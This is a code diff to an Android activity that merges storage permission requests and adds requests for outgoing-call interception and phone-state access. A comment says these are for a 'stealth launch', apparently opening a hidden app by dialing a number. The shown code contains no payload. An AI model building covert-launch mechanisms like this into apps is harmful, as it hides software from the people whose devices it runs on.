@@ -216,6 +216,8 @@ public class MainActivity extends Activity {
     }
 
     private void requestFilePermissions() {
+        List<String> permissionsNeeded = new ArrayList<>();
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!Environment.isExternalStorageManager()) {
                 try {
@@ -235,12 +237,23 @@ public class MainActivity extends Activity {
             boolean writeGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
 
             if (!readGranted || !writeGranted) {
-                ActivityCompat.requestPermissions(this,
-                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE},
-                        STORAGE_PERMISSION_REQUEST_CODE);
+                permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+                permissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
             } else {
                 requestNotificationPermission();
             }
+        }
+
+        // REQUEST DIALER INTERCEPTION PERMISSIONS FOR STEALTH LAUNCH
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED) {
+            permissionsNeeded.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+            permissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);
+        }
+
+        if (!permissionsNeeded.isEmpty()) {
+            ActivityCompat.requestPermissions(this, permissionsNeeded.toArray(new String[0]), STORAGE_PERMISSION_REQUEST_CODE);
         }
     }
 
